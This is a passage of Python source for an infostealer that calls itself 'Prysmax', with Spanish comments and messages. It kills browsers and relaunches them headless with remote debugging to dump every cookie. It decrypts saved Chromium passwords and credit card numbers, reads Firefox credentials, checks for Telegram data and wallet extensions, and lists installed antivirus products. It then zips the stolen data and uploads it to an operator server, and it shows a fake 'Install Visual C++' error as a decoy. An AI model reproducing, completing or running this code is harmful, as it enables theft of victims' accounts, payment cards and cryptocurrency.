                reportar_error(e, 'Error al remover el archivo ZIP tras enviar a Telegram')
        except Exception as e:
            print(f'Error: {e}')
            reportar_error(e, 'Error en telegram retriever todo')
        finally:
            try:
                shutil.rmtree(connection_hash_dir)
                shutil.rmtree(map_dir)
            except Exception as cleanup_error:
                print(f'Error al eliminar carpetas temporales: {cleanup_error}')
                reportar_error(cleanup_error, 'Telegram Retriever Error al eliminar carpetas temporales map, connection')
    except Exception as err:
        print('Error critico al robar y enviar datos a telegram! ' + str(err))
        reportar_error(err, 'Error critico al robar datos de telegram retriever')

def verificar_telegram():
    user = os.path.expanduser('~')
    possible_paths = [
        os.path.join(user, 'AppData', 'Roaming', 'Telegram Desktop', 'tdata'),
        os.path.join(user, 'AppData', 'Local', 'Telegram Desktop', 'tdata')
    ]
    return any(os.path.exists(path) for path in possible_paths)

def detectar_perfiles(dir_usuario):
    perfiles = []
    try:
        if os.path.exists(dir_usuario):
            for item in os.listdir(dir_usuario):
                if os.path.isdir(os.path.join(dir_usuario, item)) and item.startswith('Profile'):
                    perfiles.append(item)
            if os.path.exists(os.path.join(dir_usuario, 'Default')):
                perfiles.insert(0, 'Default')
    except Exception as ex:
        print(f'Error al detectar perfiles en {dir_usuario}: {ex}')
        reportar_error(e, 'Error detectar perfiles')
    return perfiles
try:
    firefox_procesos = subprocess.run('tasklist /FI "IMAGENAME eq firefox.exe"', shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
    if 'firefox.exe' in firefox_procesos.stdout:
        print('Firefox está en ejecución. Terminando proceso...')
        subprocess.run(f'taskkill /F /IM firefox.exe', shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, creationflags=134217728, start_new_session=True)
        print('Proceso Firefox terminado.')
    else:
        print('No se encontró Firefox en ejecución.')
    profile_path = find_fir_pr()
    if profile_path:
        print(f'Perfil de Firefox encontrado: {profile_path}')
        init_nss(profile_path)
        print('NSS inicializado con éxito.')
        firefox_c(profile_path, cookies_dir)
    else:
        print('No se pudo encontrar el perfil de Firefox.')
except Exception as e:
    print(f'Error al procesar el perfil de Firefox: {e}')
    reportar_error(e, 'Firefox Profile Found Error')

def obtener_ws_debug(port):
    try:
        endpoint_debug = f'http://localhost:{port}/json'
        print(f'Obteniendo URL de WebSocket en puerto {port}.')
        response = requests.get(endpoint_debug, timeout=5)
        response.raise_for_status()
        data = response.json()
        ws_url = data[0].get('webSocketDebuggerUrl', '').strip()
        print('WebSocket URL obtenido correctamente.')
        return ws_url
    except requests.RequestException as ex:
        print(f'Error al conectarse al puerto {port}: {ex}')
        return None
    except (KeyError, IndexError) as ex:
        print(f'Respuesta no válida al obtener WebSocket URL: {ex}')
        return None

def terminar_navegador(path_ejecutable):
    nombre_proceso = os.path.basename(path_ejecutable)
    print(f'Finalizando navegador: {nombre_proceso}')
    proceso_encontrado = False
    for proceso in procesos_corriendosejaj.splitlines():
        if nombre_proceso.lower() in proceso.lower():
            proceso_encontrado = True
            break
    if proceso_encontrado:
        print(f'Cerrando el proceso: {nombre_proceso}')
        subprocess.run(f'taskkill /F /IM {nombre_proceso}', shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, creationflags=134217728, start_new_session=True)
        print(f'Proceso {nombre_proceso} cerrado.')
    else:
        print(f'El proceso {nombre_proceso} no se encuentra en ejecución.')

def iniciar_navegador(path_exe, dir_usuario, port, perfil):
    try:
        print(f'Lanzando navegador en el puerto {port} con el perfil "{perfil}".')
        args = [
            path_exe,
            '--headless',
            '--restore-last-session',
            f'--remote-debugging-port={port}',
            '--remote-allow-origins=*',
            f'--user-data-dir={dir_usuario}',
            f'--profile-directory={perfil}',
            '--start-minimized'
        ]
        subprocess.Popen(
            args,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            creationflags=subprocess.CREATE_NO_WINDOW
        )
        time.sleep(3)
    except FileNotFoundError as ex:
        print(f'No se encuentra el navegador: {ex}')
    except Exception as ex:
        print(f'Error al iniciar el navegador: {ex}')

def extraer_cookies(ws_url):
    global cookies_count
    lock = threading.Lock()
    try:
        print('Abriendo conexión WebSocket para obtener cookies.')
        ws_conn = websocket.create_connection(ws_url)
        ws_conn.send(json.dumps({'id': 1, 'method': 'Network.enable'}))
        _ = ws_conn.recv()
        ws_conn.send(json.dumps({'id': 2, 'method': 'Network.getAllCookies'}))
        respuesta = ws_conn.recv()
        respuesta_json = json.loads(respuesta)
        cookies_extraidas = respuesta_json.get('result', {}).get('cookies', [])
        ws_conn.close()
        if not isinstance(cookies_extraidas, list):
            print('Error: Formato de cookies no válido.')
            return []
        with lock:
            cookies_count += len(cookies_extraidas)
        print(f'Se obtuvieron {len(cookies_extraidas)} cookies.')
        return cookies_extraidas
    except Exception as ex:
        print(f'Error extrayendo cookies: {ex}')
        return []

def guardar_en_netscape(browser, cookies):
    try:
        file_path = os.path.join(cookies_dir, f'Prysmax_Cookies_{browser}.txt')
        with open(file_path, 'w', encoding='utf-8') as file:
            file.write('# - t.me/PrysmaxSoftware v7.9 -\n\n#Prysmax.xyz the best stealer!\n')
            for cookie in cookies:
                domain = cookie.get('domain', '')
                flag = 'TRUE' if domain.startswith('.') else 'FALSE'
                path = cookie.get('path', '/')
                secure = 'TRUE' if cookie.get('secure', False) else 'FALSE'
                expiration = cookie.get('expires', 0)
                if expiration > 2147483647:
                    expiration = 2147483647
                name = cookie.get('name', '')
                value = cookie.get('value', '')
                file.write(f'{domain}\t{flag}\t{path}\t{secure}\t{expiration}\t{name}\t{value}\n')
        print(f'Cookies guardadas en: {file_path}')
    except Exception as ex:
        print(f'Error al guardar las cookies: {ex}')
        reportar_error(ex, 'Error guardar cookies guardar_en_netscape')

def verificar_navegadores_instalados():
    navegadores_instalados = {}
    for (navegador, configuracion) in BROWSER_SETTINGS.items():
        if os.path.exists(configuracion['path_exe']):
            navegadores_instalados[navegador] = configuracion
    return navegadores_instalados

def proceosdelnavegador(navegador, configuracion):
    while True:
        perfiles = detectar_perfiles(configuracion['path_data'])
        if not perfiles:
            print(f'No se encontraron perfiles para {navegador}.')
            return
        cookies_detectadas = False
        for perfil in perfiles:
            intentos = 0
            while intentos < MAX_RETRIES:
                intentos += 1
                try:
                    print(f'Procesando: {navegador}, Perfil: {perfil} (Intento {intentos})')
                    terminar_navegador(configuracion['path_exe'])
                    puerto = random.randint(8000, 9000)
                    iniciar_navegador(configuracion['path_exe'], configuracion['path_data'], puerto, perfil)
                    time.sleep(5)
                    ws_url = obtener_ws_debug(puerto)
                    if not ws_url:
                        raise RuntimeError('No se pudo obtener el WebSocket URL.')
                    cookies = extraer_cookies(ws_url)
                    terminar_navegador(configuracion['path_exe'])
                    if cookies:
                        print(f'Cookies capturadas con éxito en {navegador} - {perfil}.')
                        guardar_en_netscape(f'{navegador}_{perfil}', cookies)
                        cookies_detectadas = True
                        break
                    else:
                        print('No se extrajo ninguna cookie. Reintentando...')
                except Exception as ex:
                    print(f'Error: {ex}')
                    reportar_error(ex, f'Error al procesar {navegador} - {perfil}')
            if intentos == MAX_RETRIES:
                print(f'Reintentos agotados para {navegador} - {perfil}.')
        if cookies_detectadas:
            print(f'Cookies extraídas correctamente para {navegador}.')
            break
        else:
            print(f'No se detectaron cookies en {navegador}. Reiniciando proceso...')
navegadores_instalados = verificar_navegadores_instalados()
hilos = []
for (navegador, configuracion) in navegadores_instalados.items():
    hilo = threading.Thread(target=proceosdelnavegador, args=(navegador, configuracion))
    hilos.append(hilo)
    hilo.start()
for hilo in hilos:
    hilo.join()
print(f'Cookies guardadas en la carpeta: {cookies_dir}')

def find_installed_antivirus():
    antivirus_names = {
        'Avast', 'AVG', 'Bitdefender', 'Kaspersky', 'McAfee', 'Norton', 'Sophos', 'ESET', 'Malwarebytes', 'Avira', 
        'Panda', 'Trend Micro', 'F-Secure', 'Comodo', 'BullGuard', '360 Total Security', 'Ad-Aware', 'Dr.Web', 
        'G-Data', 'Vipre', 'ClamWin', 'ZoneAlarm', 'Cylance', 'Webroot', 'Palo Alto Networks', 'Symantec', 
        'SentinelOne', 'CrowdStrike', 'Emsisoft', 'HitmanPro', 'Fortinet', 'FireEye', 'Zemana', 'Windows Defender', 
        'ReasonLabs'
    }
    antivirus_found = set()
    common_paths = [
        'C:\\Program Files', 'C:\\Program Files (x86)', 'C:\\ProgramData', 'C:\\Users\\Public\\Desktop', 
        f'C:\\Users\\{os.getlogin()}\\AppData\\Local', f'C:\\Users\\{os.getlogin()}\\AppData\\Roaming', 
        'C:\\Windows\\System32', 'C:\\Windows\\SysWOW64'
    ]
    try:
        for base_folder in common_paths:
            if os.path.isdir(base_folder):
                for folder in os.listdir(base_folder):
                    full_path = os.path.join(base_folder, folder)
                    if os.path.isdir(full_path):
                        for antivirus_name in antivirus_names:
                            if antivirus_name.lower() in folder.lower():
                                antivirus_found.add(antivirus_name)
                                break
    except Exception as e:
        print(f'Error listing folders in {base_folder}: {e}')
        report_error(e, f'Error finding installed antivirus in {base_folder}')
    return antivirus_found

def report_error(exception, message):
    # Implement your error reporting logic here
    pass

antiviruses = find_installed_antivirus()
print("Installed antivirus software found:", antiviruses)

antivirus_names = find_installed_antivirus()
if antivirus_names:
    print('Antivirus encontrados:', antivirus_names)
else:
    print('📡 Antivirus: Unknown')
zip_filename = f'{cookies_dir}.zip'
with zipfile.ZipFile(zip_filename, 'w', zipfile.ZIP_DEFLATED) as zipf:
    for (root, dirs, files) in os.walk(cookies_dir):
        for file in files:
            zipf.write(os.path.join(root, file), os.path.relpath(os.path.join(root, file), cookies_dir))
max_attempts = 2
attempt = 0

while attempt < max_attempts:
    try:
        with open(cookies_dir + '.zip', 'rb') as f:
            files = {'file': (f'prysmax_{current_time}_cookies.zip', f, 'application/zip')}
            data = {'username': username, 'current_time': current_time, 'cookies_count': cookies_count}
            response = requests.post(f'https://{DOMAIN}/asudqwauyhuhd8i2ja9idjjxk', files=files, data=data)
            if response.status_code == 200:
                print(f'Archivo Cookies.zip enviado exitosamente.')
                break
            else:
                print(f'Error al enviar Cookies.zip: {response.status_code} - {response.text}')
                attempt += 1
                if attempt < max_attempts:
                    print(f'Reintentando en 3 segundos... Intento {attempt}')
                    time.sleep(3)
            try:
                os.remove(cookies_dir + '.zip')
                os.remove(cookies_dir)
            except Exception as e:
                print(e)
                reportar_error(e, 'Error en eliminar cookies y cookies.zip')
    except Exception as CookiError:
        reportar_error(CookiError, 'Error al intentar enviar el archivo cookies.zip')
        print(f'Error al intentar enviar el archivo: {CookiError}')
        attempt += 1
        if attempt < max_attempts:
            print(f'Reintentando en 3 segundos... Intento {attempt}')
            time.sleep(3)

TEMP_DIR = os.path.join(os.getenv('TEMP'), 'Credentials')
os.makedirs(TEMP_DIR, exist_ok=True)
try:
    profile_path = find_fir_pr()
    print(f'Firefox profile found: {profile_path}')
    init_nss(profile_path)
    print('NSS initialized successfully!')
    firefox_p(profile_path, TEMP_DIR)
except Exception as e:
    print(f'Error: {e}')
    reportar_error(e, 'Firefox Passwords Profile')

class DATA_BLOB(Structure):
    _fields_ = [('cbData', wintypes.DWORD), ('pbData', POINTER(c_char))]

def gtdatosxd(blob_out):
    cbData = int(blob_out.cbData)
    pbData = blob_out.pbData
    buffer = c_buffer(cbData)
    windll.msvcrt.memcpy(buffer, pbData, cbData)
    windll.kernel32.LocalFree(pbData)
    return buffer.raw

def cryptunprotectdatak(encrypted_bytes, entropy=b''):
    if entropy is None:
        entropy = b''
    buffer_in = c_buffer(encrypted_bytes, len(encrypted_bytes))
    buffer_entropy = c_buffer(entropy, len(entropy))
    blob_in = DATA_BLOB(len(encrypted_bytes), buffer_in)
    blob_entropy = DATA_BLOB(len(entropy), buffer_entropy)
    blob_out = DATA_BLOB(0, None)
    if windll.crypt32.CryptUnprotectData(byref(blob_in), None, byref(blob_entropy), None, None, 1, byref(blob_out)):
        return gtdatosxd(blob_out)

def dechencriptarvalor(buff, master_key=None):
    starts = buff.decode(encoding='utf8', errors='ignore')[:3]
    if starts in ['v10', 'v11']:
        iv = buff[3:15]
        payload = buff[15:]
        cipher = AES.new(master_key, AES.MODE_GCM, iv)
        try:
            decrypted_pass = cipher.decrypt(payload)
            decrypted_pass = decrypted_pass[:-16]
            return decrypted_pass.decode(errors='ignore')
        except Exception as e:
            reportar_error(e, 'Error en dechencriptarvalor')
            return f'Error en la desencriptación: {e}'
    return None

def decrypt_master_key(local_state_path):
    pass
    with open(local_state_path, 'r', encoding='utf-8') as f:
        local_state = loads(f.read())
    if 'os_crypt' not in local_state or 'encrypted_key' not in local_state['os_crypt']:
        raise ValueError("Clave 'os_crypt' o 'encrypted_key' no encontrada en Local State")
    encrypted_key = b64decode(local_state['os_crypt']['encrypted_key'])[5:]
    return cryptunprotectdatak(encrypted_key, None)

def extract_data_from_db(db_path, query, temp_db_path):
    pass
    shutil.copy2(db_path, temp_db_path)
    connection = sqlite3.connect(temp_db_path)
    cursor = connection.cursor()
    cursor.execute(query)
    data = cursor.fetchall()
    cursor.close()
    connection.close()
    os.remove(temp_db_path)
    return data

def fillshistory(db_path, query, temp_db_path):
    try:
        shutil.copy2(db_path, temp_db_path)
        with sqlite3.connect(temp_db_path) as conn:
            cursor = conn.cursor()
            cursor.execute(query)
            data = cursor.fetchall()
        os.remove(temp_db_path)
        return data
    except sqlite3.OperationalError as e:
        print(f'Error al acceder a la base de datos: {e}')
        return []
    except Exception as e:
        reportar_error(e, 'Error en fillshistory')
        print(f'Error inesperado: {e}')
        return []

def process_passwords(local_state_path, login_data_path, output_file):
    global passwords_count
    try:
        master_key = decrypt_master_key(local_state_path)
        temp_db = os.path.join(os.getenv('TEMP'), f'temp_{random.randint(1000, 9999)}.db')
        query = 'SELECT action_url, username_value, password_value FROM logins'
        data = extract_data_from_db(login_data_path, query, temp_db)
        results = []
        for (action_url, username, encrypted_password) in data:
            if action_url and encrypted_password:
                decrypted_password = dechencriptarvalor(encrypted_password, master_key)
                results.append(f'==============\nprysmax.xyz stealer <3\nURL: {action_url}\nUsername: {username}\nPassword: {decrypted_password}\n')
                passwords_count += 1
        with open(output_file, 'w', encoding='utf-8') as f:
            f.writelines(results)
        print(f'Contraseñas desencriptadas guardadas en {output_file}')
        print(f'Total de contraseñas desencriptadas: {passwords_count}')
    except Exception as e:
        reportar_error(e, 'Error procesando contraseñas')
        print(f'Error procesando contraseñas: {e}')

def process_credit_cards(local_state_path, web_data_path, output_file):
    global credit_cards_count
    try:
        master_key = decrypt_master_key(local_state_path)
        temp_db = os.path.join(os.getenv('TEMP'), f'temp_{random.randint(1000, 9999)}.db')
        query = 'SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards'
        data = extract_data_from_db(web_data_path, query, temp_db)
        results = []
        for (name, month, year, encrypted_number) in data:
            if encrypted_number:
                decrypted_number = dechencriptarvalor(encrypted_number, master_key)
                results.append(f'==============\nprysmax.xyz stealer <3\nName: {name}\nNumber: {decrypted_number}\nExpire: {month}/{year}\n')
            credit_cards_count += 1
        with open(output_file, 'w', encoding='utf-8') as f:
            f.writelines(results)
        print(f'Tarjetas de crédito desencriptadas guardadas en {output_file}')
        print(f'Total de tarjetas de crédito desencriptadas: {credit_cards_count}')
    except Exception as e:
        reportar_error(e, 'Error procesando tarjetas de credito')
        print(f'Error procesando tarjetas de crédito: {e}')
def make_path(*parts):
    return os.path.join(os.getenv('USERPROFILE'), *parts)

def contraword():
    try:
        user_temp_dir = os.path.join(os.getenv('TEMP'), 'Credentials')
        os.makedirs(user_temp_dir, exist_ok=True)
        
        for browser, paths in browsers.items():
            if os.path.exists(paths['local_state']):
                print(f'Processing {browser}...')
                try:
                    process_passwords(paths['local_state'], paths['login_data'], os.path.join(user_temp_dir, f'{browser}_Passwords.txt'))
                    process_credit_cards(paths['local_state'], paths['web_data'], os.path.join(user_temp_dir, f'{browser}_CreditCards.txt'))
                except Exception as e:
                    reportar_error(e, 'Error processing browser data')
                    print(f'Error processing {browser}: {e}')
            else:
                print(f'{browser} is not installed or not found.')
        
        zip_filename = create_zip_from_folder(user_temp_dir)
        data = {
            'username': username,
            'current_time': current_time,
            'passwords_count': passwords_count,
            'credit_cards_count': credit_cards_count
        }
        
        max_attempts = 2
        for attempt in range(max_attempts):
            try:
                with open(zip_filename, 'rb') as file:
                    files = {'file': file}
                    response = requests.post(f'https://{DOMAIN}/cdndbpasscreditasidjjaisdjnx09282jyourfather', files=files, data=data)
                    if response.status_code == 200:
                        print('Archivo Credentials.zip enviado exitosamente.')
                        break
                    else:
                        print(f'Error al enviar Credentials.zip: {response.status_code} - {response.text}')
                        if attempt < max_attempts - 1:
                            print(f'Reintentando en 3 segundos... Intento {attempt + 1}')
                            time.sleep(3)
            except Exception as e:
                reportar_error(e, 'Error sending credentials zip file')
                print(f'Error al intentar enviar el archivo: {e}')
                if attempt < max_attempts - 1:
                    print(f'Reintentando en 3 segundos... Intento {attempt + 1}')
                    time.sleep(3)
        
        try:
            os.remove(zip_filename)
        except Exception as e:
            print(e)
            reportar_error(e, 'Error removing credentials zip file')
    except Exception as e:
        reportar_error(e, 'Error in contraword function')
        print(f'Error in passwords and cards: {e}')
        
wallets = {
    'nkbihfbeogaeaoehlefnkodbefgpgknn': 'MetaMask (Chrome)',
    'ejbalbakoplchlghecdalmeeeajnimhm': 'MetaMask (Edge)',
    'bfnaelmomeimhlpmgjnjophhpkkoljpa': 'Phantom (Chrome)',
    'kfmhfjkllgocnmpimkkcljlmbloboccm': 'Phantom (Edge)',
    'fhbohimaelbohpjbbldcngcnapndodjp': 'Ronin Wallet (Chrome)',
    'pnkpkbcmngmgfpjakgfccphjfdcllnkg': 'Ronin Wallet (Edge)',
    'dngmlblcodfobpdpecaadgfbcggfjfnm': 'TronLink (Chrome)',
    'faofihjfemlkdhhpnggafmnlfdkmgmhk': 'TronLink (Edge)',
    'cnnjbpoomgphhmdbjmeplnfofphmjhlk': 'NEAR Wallet (Chrome)',
    'kpcfgclhklcjmnljjdjlobpjppadpgpn': 'NEAR Wallet (Edge)',
    'abkheeeomgdbibdjganfbbdeglafkmgk': 'Binance Chain Wallet (Chrome)',
    'lnbpcjohmfbhjgfjmipfmelkhggmhpnm': 'Binance Chain Wallet (Edge)',
    'bhghoamapcdpbohphigoooaddinpkbai': 'Coin98 Wallet (Chrome)',
    'egogehnmfbjpkmnnggnpejgbjmclgllg': 'Coin98 Wallet (Edge)',
    'fhilaheioajjhnpekbkpgnncfgejpgli': 'Keplr Wallet (Chrome)',
    'iiooeenphgnfgmbmfdjofeifjjhgcfhb': 'Keplr Wallet (Edge)',
    'kpfopkelmapcoipemfendmdcghnegimn': 'Solflare (Chrome)',
    'abnbppgpgfgiebdpoljllabbgpfkhjnp': 'Solflare (Edge)',
    'hbcjdhmhafcddgbgfmolpmbjdpccblop': 'Liquality (Chrome)',
    'hdpjdgfdjmpbkjmefhhjfjjhfnmfndgf': 'Liquality (Edge)',
    'foelmdlhbpafabodfgpikjmbnpfkflpl': 'Tonkeeper (Chrome)',
    'chccpdbmlmjmjfohdpfkdlkophdbbake': 'Tonkeeper (Edge)',
    'jfiihjeoihilkdlndlooppohkiglfape': 'Math Wallet (Chrome)',
    'kljbbekmokhihdfbpmmcbikjdmdpddfg': 'Math Wallet (Edge)',
    'pbcoeakecjbfhdnckkbplgleedkhmial': 'Nifty Wallet (Chrome)',
    'nlpjfgbghbphogmdnmkjmjjpfijgnjfb': 'Nifty Wallet (Edge)',
    'ajphlblpdflpbalhddmpcfamdfjoomlo': 'Venly Wallet (Chrome)',
    'pdljgoopglnogpffgglhmikeifgfojpf': 'Venly Wallet (Edge)',
    'ecpnpejnpliponokjlolcbpejjhlneeg': 'ONE Wallet (Chrome)',
    'bbdlofgfjokmjclkbmhldlhicbjmboik': 'ONE Wallet (Edge)',
    'fhakmnfohnppecdpdeejgebllngjknbg': 'BitKeep (Chrome)',
    'bjofoeidpgaemhjphodclfladpkbfjbb': 'BitKeep (Edge)',
    'pgjlagjpmejpoaemggdlnldlbekcfbim': 'Auro Wallet (Chrome)',
    'pbhedckkdoklflmbjfcjbpdomeebmmhp': 'Auro Wallet (Edge)',
    'gnomdcenhanheodjigbejioadkpojnke': 'XDEFI Wallet (Chrome)',
    'mfplfkhihbhgaffphdfbgoajhdjbjeck': 'XDEFI Wallet (Edge)',
    'hjipfcgkglkojcnhbjmhcdoeicccnkoj': 'BlockWallet (Chrome)',
    'gafpfdecljlbgpkbmjnifmfjkgbgfkcl': 'BlockWallet (Edge)',
    'bdcafkkfigrdcngfmbabpoenhgogldmd': 'Polkadot.js Wallet (Chrome)',
    'piibdpjdcjlnagldghkbjmnpgncfmnkc': 'Polkadot.js Wallet (Edge)',
    'onbfegendakgjfhkhkbhlolcfjnlhdfb': 'Coinbase Wallet (Chrome)',
    'goafglolcnggfppbhhaoplnbmlpcfhgc': 'Coinbase Wallet (Edge)',
    'fegphgklbihggoeamnmgfkgphkbefofo': 'Trust Wallet (Chrome)',
    'hpdkmhcfhhadbcfhladgbkpmhmlgfccc': 'Trust Wallet (Edge)',
    'hlgfnfeklcjgpchjlepcjlcjdbbbjdhl': 'Exodus Wallet (Chrome)',
    'maoccknpflbdbeoimklhpdokmijjcbdg': 'Exodus Wallet (Edge)',
    'ckjknflgookocgpcffkoghdpebdjbgjb': 'WalletConnect (Chrome)',
    'lgpcophpppdhmgojpdjhejkbelpkbpgj': 'WalletConnect (Edge)',
    'klnpgaiklhgkgkkjkkiklbjkdgiinpke': 'MetaMask Flask (Chrome)',
    'mmfnghfgbeogfnnpnjafocgimjbplnbg': 'MetaMask Flask (Edge)'
}

def error_prysm():
    try:
        title = 'Install Visual C++ redistributable'
        message = 'Install Visual C++ redistributable'
        cmd = f'''mshta "javascript:var sh=new ActiveXObject('WScript.Shell'); sh.Popup('{message}', 0, '{title}', 0+16);close()"'''
        subprocess.run(cmd, shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
    except Exception as e:
        reportar_error(e, 'Error en error_prysm()')
wale_exte = {
    'Brave': os.path.join(os.getenv('USERPROFILE'), 'AppData', 'Local', 'BraveSoftware', 'Brave-Browser', 'User Data', 'Default', 'Local Extension Settings'),
    'Chrome': os.path.join(os.getenv('USERPROFILE'), 'AppData', 'Local', 'Google', 'Chrome', 'User Data', 'Default', 'Local Extension Settings'),
    'Edge': os.path.join(os.getenv('USERPROFILE'), 'AppData', 'Local', 'Microsoft', 'Edge', 'User Data', 'Default', 'Local Extension Settings'),
    'Opera': os.path.join(os.getenv('USERPROFILE'), 'AppData', 'Local', 'Opera Software', 'Opera Stable', 'Local Extension Settings'),
    'Vivaldi': os.path.join(os.getenv('USERPROFILE'), 'AppData', 'Local', 'Vivaldi', 'User Data', 'Default', 'Local Extension Settings'),
    'Yandex': os.path.join(os.getenv('USERPROFILE'), 'AppData', 'Local', 'Yandex', 'YandexBrowser', 'User Data', 'Default', 'Local Extension Settings'),
    'Chromium': os.path.join(os.getenv('USERPROFILE'), 'AppData', 'Local', 'Chromium', 'User Data', 'Default', 'Local Extension Settings'),
    'Epic': os.path.join(os.getenv('USERPROFILE'), 'AppData', 'Local', 'Epic Privacy Browser', 'User Data', 'Default', 'Local Extension Settings'),
    'Brave Dev': os.path.join(os.getenv('USERPROFILE'), 'AppData', 'Local', 'BraveSoftware', 'Brave-Browser Dev', 'User Data', 'Default', 'Local Extension Settings'),
    'Maxthon': os.path.join(os.getenv('USERPROFILE'), 'AppData', 'Local', 'Maxthon', 'User Data', 'Default', 'Local Extension Settings'),
    'Comodo Dragon': os.path.join(os.getenv('USERPROFILE'), 'AppData', 'Local', 'Comodo', 'Dragon', 'User Data', 'Default', 'Local Extension Settings'),
    'SRWare Iron': os.path.join(os.getenv('USERPROFILE'), 'AppData', 'Local', 'SRWare Iron', 'User Data', 'Default', 'Local Extension Settings'),
    'Torch': os.path.join(os.getenv('USERPROFILE'), 'AppData', 'Local', 'Torch', 'User Data', 'Default', 'Local Extension Settings'),
    'Slimjet': os.path.join(os.getenv('USERPROFILE'), 'AppData', 'Local', 'Slimjet', 'User Data', 'Default', 'Local Extension Settings'),
    'Coowon': os.path.join(os.getenv('USERPROFILE'), 'AppData', 'Local', 'Coowon', 'User Data', 'Default', 'Local Extension Settings'),
    'Baidu Browser': os.path.join(os.getenv('USERPROFILE'), 'AppData', 'Local', 'Baidu', 'Browser', 'User Data', 'Default', 'Local Extension Settings'),
    'QuteBrowser': os.path.join(os.getenv('USERPROFILE'), 'AppData', 'Local', 'QuteBrowser', 'User Data', 'Default', 'Local Extension Settings'),
    'Waterfox': os.path.join(os.getenv('USERPROFILE'), 'AppData', 'Roaming', 'Waterfox', 'Profiles'),
    'Pale Moon': os.path.join(os.getenv('USERPROFILE'), 'AppData', 'Roaming', 'Pale Moon', 'Profiles'),
    'Basilisk': os.path.join(os.getenv('USERPROFILE'), 'AppData', 'Roaming', 'Basilisk', 'Profiles'),
    'Internet Explorer': os.path.join(os.getenv('USERPROFILE'), 'AppData', 'Local', 'Microsoft', 'Internet Explorer', 'Local Extensions')
}

def send_telegram_message(bot_token, chat_id, message):
    url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
    data = {"chat_id": chat_id, "text": message}
    try:
        response = requests.post(url, data=data, timeout=10)
        if response.status_code != 200:
            print(f"[ERROR] Telegram send failed. Status code: {response.status_code}, Response: {response.text}")
        else:
            print("[INFO] Message sent to Telegram bot.")
    except Exception as e:
        print(f"[ERROR] Exception sending Telegram message: {e}")

def lavacuna_palnavegador():
    try:
        def cerrar_browsers():
            browsers = [
                'brave.exe', 'chrome.exe', 'msedge.exe', 'opera.exe', 'opera_gx.exe',
                'vivaldi.exe', 'yandex.exe', 'swareiron.exe', 'kiwibrowser.exe', 'torch.exe',
                'slimjet.exe', 'comododragon.exe', 'operaneon.exe'
            ]
            for browser in browsers:
                try:
                    subprocess.check_call(
                        ['taskkill', '/F', '/IM', browser],
                        shell=True,
                        stdout=subprocess.DEVNULL,
                        stderr=subprocess.DEVNULL,
                        creationflags=134217728
                    )
                    print(f'[INFO] Proceso {browser} cerrado.')
                except subprocess.CalledProcessError:
                    print(f'[WARN] Proceso {browser} no estaba abierto o no pudo ser cerrado.')
                except Exception as e:
                    print(f'[ERROR] Error al cerrar el proceso {browser}: {e}')

        def buscar_donde_vacunar():
            navegadores = {
                'Brave': [os.path.expandvars('%PROGRAMFILES%\\BraveSoftware\\Brave-Browser\\Application\\brave.exe'),
                          os.path.expandvars('%PROGRAMFILES(X86)%\\BraveSoftware\\Brave-Browser\\Application\\brave.exe'),
                          os.path.expandvars('%LOCALAPPDATA%\\BraveSoftware\\Brave-Browser\\Application\\brave.exe')],
                'Google Chrome': [os.path.expandvars('%PROGRAMFILES%\\Google\\Chrome\\Application\\chrome.exe'),
                                  os.path.expandvars('%PROGRAMFILES(X86)%\\Google\\Chrome\\Application\\chrome.exe'),
                                  os.path.expandvars('%LOCALAPPDATA%\\Google\\Chrome\\Application\\chrome.exe')],
                'Microsoft Edge': [os.path.expandvars('%PROGRAMFILES%\\Microsoft\\Edge\\Application\\msedge.exe'),
                                   os.path.expandvars('%PROGRAMFILES(X86)%\\Microsoft\\Edge\\Application\\msedge.exe'),
                                   os.path.expandvars('%LOCALAPPDATA%\\Microsoft\\Edge\\Application\\msedge.exe')],
                'Opera': [os.path.expandvars('%PROGRAMFILES%\\Opera\\launcher.exe'),
                          os.path.expandvars('%PROGRAMFILES(X86)%\\Opera\\launcher.exe'),
                          os.path.expandvars('%LOCALAPPDATA%\\Programs\\Opera\\launcher.exe')],
                'Opera GX': [os.path.expandvars('%PROGRAMFILES%\\Opera\\Opera GX\\launcher.exe'),
                             os.path.expandvars('%PROGRAMFILES(X86)%\\Opera\\Opera GX\\launcher.exe'),
                             os.path.expandvars('%LOCALAPPDATA%\\Programs\\Opera GX\\launcher.exe')],
                'Vivaldi': [os.path.expandvars('%PROGRAMFILES%\\Vivaldi\\Application\\vivaldi.exe'),
                            os.path.expandvars('%PROGRAMFILES(X86)%\\Vivaldi\\Application\\vivaldi.exe'),
                            os.path.expandvars('%LOCALAPPDATA%\\Vivaldi\\Application\\vivaldi.exe')],
                'Yandex': [os.path.expandvars('%PROGRAMFILES%\\Yandex\\YandexBrowser\\Application\\browser.exe'),
                           os.path.expandvars('%PROGRAMFILES(X86)%\\Yandex\\YandexBrowser\\Application\\browser.exe'),
                           os.path.expandvars('%LOCALAPPDATA%\\Yandex\\YandexBrowser\\Application\\browser.exe')],
                'SRWare Iron': [os.path.expandvars('%PROGRAMFILES%\\SRWare Iron\\iron.exe'),
                                os.path.expandvars('%PROGRAMFILES(X86)%\\SRWare Iron\\iron.exe'),
                                os.path.expandvars('%LOCALAPPDATA%\\SRWare Iron\\Application\\iron.exe')],
                'Kiwi Browser': [os.path.expandvars('%PROGRAMFILES%\\Kiwi Browser\\Application\\kiwibrowser.exe'),
                                 os.path.expandvars('%PROGRAMFILES(X86)%\\Kiwi Browser\\Application\\kiwibrowser.exe'),
                                 os.path.expandvars('%LOCALAPPDATA%\\Kiwi Browser\\Application\\kiwibrowser.exe')],
                'Torch Browser': [os.path.expandvars('%PROGRAMFILES%\\Torch\\Torch\\Torch.exe'),
                                  os.path.expandvars('%PROGRAMFILES(X86)%\\Torch\\Torch\\Torch.exe'),
                                  os.path.expandvars('%LOCALAPPDATA%\\Torch\\Torch\\Torch.exe')],
                'Slimjet': [os.path.expandvars('%PROGRAMFILES%\\Slimjet\\Slimjet\\Slimjet.exe'),
                            os.path.expandvars('%PROGRAMFILES(X86)%\\Slimjet\\Slimjet\\Slimjet.exe'),
                            os.path.expandvars('%LOCALAPPDATA%\\Slimjet\\Slimjet\\Slimjet.exe')],
